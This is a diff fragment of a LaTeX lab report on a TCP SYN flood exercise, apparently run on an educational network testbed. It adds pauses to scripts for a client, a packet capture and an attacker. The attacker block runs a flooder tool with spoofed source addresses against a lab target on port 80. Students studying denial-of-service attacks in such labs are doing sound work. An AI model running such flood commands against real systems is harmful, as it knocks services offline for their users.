@@ -110,9 +110,8 @@ I decided to settle on \verb=1000= packets per second for the DoS attack, a good
   while sleep 1; do curl server/index.html >/dev/null 2>/dev/null; done;
   EOF
 
-  # sudo tcpdump -nn -i eth1
-
   chmod +x script.sh
+  read -p "Press Enter to continue..."
   sudo tcpdump -nn -v -s0 -i ${ETH} -w cookie.pcap &
   ./script.sh
 \end{code}
@@ -120,6 +119,7 @@ I decided to settle on \verb=1000= packets per second for the DoS attack, a good
 \begin{code}{Code for the attacker}
   /share/education/TCPSYNFlood_USC_ISI/install-flooder
 
+  read -p "Press Enter to continue..."
   sudo flooder --dst 5.6.7.8 --src 1.1.2.0
   --srcmask 255.255.255.0 --highrate 100
   --lowrate 100 --proto 6 --dportmin 80
